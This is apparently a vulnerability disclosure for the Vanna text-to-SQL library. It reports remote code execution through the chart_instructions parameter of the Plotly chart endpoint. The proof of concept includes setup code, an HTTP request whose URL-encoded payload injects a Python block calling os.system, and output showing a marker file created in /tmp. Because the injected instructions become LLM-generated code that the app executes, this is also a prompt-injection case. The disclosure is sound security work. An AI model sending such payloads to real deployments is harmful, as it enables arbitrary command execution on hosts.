# Description

When the user generates a chart based on a SQL query, it can lead to arbitrary code execution.

# Proof of Concept

The following is a simple reproducible code.
```python
// PoC.py
import vanna 
from vanna.remote import VannaDefault
import pandas as pd
import os

vn = VannaDefault(model='vn_test', api_key='xxxx')
vn.connect_to_sqlite('https://vanna.ai/Chinook.sqlite')

from vanna.flask import VannaFlaskApp
VannaFlaskApp(vn).run()
```
Execute the above code to open the web interface. When drawing a chart for the queried SQL statement, the vulnerability is triggered.
```
GET /api/v0/generate_plotly_figure?id=e258cf3f-35ad-4997-8b61-de271bf96019&chart_instructions=%3B%0A%60%60%60python%0Aos.system(%27touch%20%2Ftmp%2Frce%27)%0A%60%60%60 HTTP/1.1
Host: localhost:8084
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8084/
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```
check the result:
```sh
$ ls /tmp/
rce
```
# Impact

An attacker who exploits this vulnerability can execute arbitrary commands on the host system, including but not limited to file operations, system configuration changes, data leakage, etc.
